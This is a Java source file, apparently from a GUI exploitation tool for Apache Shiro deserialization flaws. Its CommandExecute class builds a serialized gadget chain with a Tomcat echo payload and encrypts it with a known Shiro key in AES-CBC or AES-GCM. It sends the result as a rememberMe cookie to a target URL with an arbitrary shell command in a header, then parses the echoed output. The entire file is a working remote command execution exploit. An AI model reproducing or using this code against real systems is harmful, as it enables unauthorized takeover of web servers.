package core;

import common.HttpUtils;
import common.PayloadEncrypt;
import entity.ControllersFactory;
import payloads.echo.TomcatEcho;
import payloads.util.Serializer;
import ui.MyController;
import java.lang.reflect.Method;
import java.util.Map;

public class CommandExecute {
    final private MyController myController = (MyController) ControllersFactory.controllers.get(MyController.class.getSimpleName());
    final private Map<String,String> paramContext = ControllersFactory.paramsContext;
    final private Map<String,Class> successGadget = ControllersFactory.successGadget;
    private HttpUtils httpUtils = new HttpUtils();

//    final private Map<String,byte[]> loaderByte = ControllersFactory.loaderByte;

    public void tomcatCommandExecute(String gadget,String cmd) throws Exception {
        Class gadgetClass = successGadget.get(gadget);
        // 如果不为null的话，就返回对应利用链，利用反射调用他们的方法
        if (gadgetClass != null){
            String k = paramContext.get("ShiroKey");
            String url = paramContext.get("URL");
            String resp = null;
            String echoCookie = null;
            // 利用反射调用 getObject ，然后将 TomcatEcho 的 payload 作为参数进行传入，并对结果进行序列化
            Method getObject = gadgetClass.getDeclaredMethod("getObject",byte[].class);
            getObject.setAccessible(true);
            byte[] bytes = Serializer.serialize(getObject.invoke(gadgetClass.newInstance(), TomcatEcho.tomcatEchoPayload())); // 利用反射进行调用

            //交给 shiro 进行加密
            String encryptType = this.paramContext.get("Encrypt");
            if (encryptType.equals("CBC")){
                echoCookie = paramContext.get("rememberMe") + "=" + PayloadEncrypt.AesCbcEncrypt(bytes,k);
            } else{
                echoCookie = paramContext.get("rememberMe") + "=" + PayloadEncrypt.AesGcmEncrypt(bytes,k);
            }

            // 执行的命令在 header 中 co0kie
            if (paramContext.get("Method").equals("GET")){
                resp = this.httpUtils.getGetRequestResponse(url,echoCookie,cmd);
            } else {
                resp = this.httpUtils.getPostRequestResponse(url,echoCookie,cmd);
            }

            if (paramContext.get("OutputType").equals("1")){
                this.myController.result.appendText("\nPayload输出模式:");
                this.myController.result.appendText("\n" + echoCookie + "\n");
                this.myController.result.appendText("co0kie:" + cmd + "\n");
            }

            this.myController.result.appendText("[+] 命令: " +cmd);
            // 这里需要处理的，我们需要把结果放在 $$$ 之间
            if (resp.indexOf("$$$") != -1){
                int start = resp.indexOf("$$$");
                int end = resp.lastIndexOf("$$$");
                String cmdResp = resp.substring(start+3,end);
                this.myController.result.appendText(cmdResp);
            }else {
                this.myController.result.appendText("[!] 未检测到回显标志符，请结合Payload输出模式进行手动排查\n");
            }
        } else {
            this.myController.result.appendText("[!] 请先检测对应的利用链！\n");
        }
    }
}
